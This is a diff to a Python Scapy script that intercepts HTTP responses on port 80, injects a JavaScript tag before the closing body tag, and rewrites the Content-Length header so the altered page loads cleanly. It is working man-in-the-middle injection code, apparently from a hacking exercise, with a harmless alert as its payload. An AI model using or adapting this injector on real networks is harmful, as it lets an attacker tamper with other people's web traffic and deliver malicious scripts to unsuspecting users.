@@ -23,8 +23,14 @@ def process_packets(packet):
 
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
-            load = load.replace("</body>", "<script>alert('test');</script></body>")
-            print(scapy_packet.show())
+            injection_code = "<script>alert('test');</script>"
+            load = load.replace("</body>", injection_code + "</body>")
+            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+            if content_length_search and "text/html" in load:
+                content_length = content_length_search.group(1)
+                new_content_length = int(content_length) + len(injection_code)
+                load = load.replace(content_length, str(new_content_length))
+            # print(scapy_packet.show())
 
         if load != scapy_packet[scapy.Raw].load:
             new_packet = set_load(scapy_packet, load)
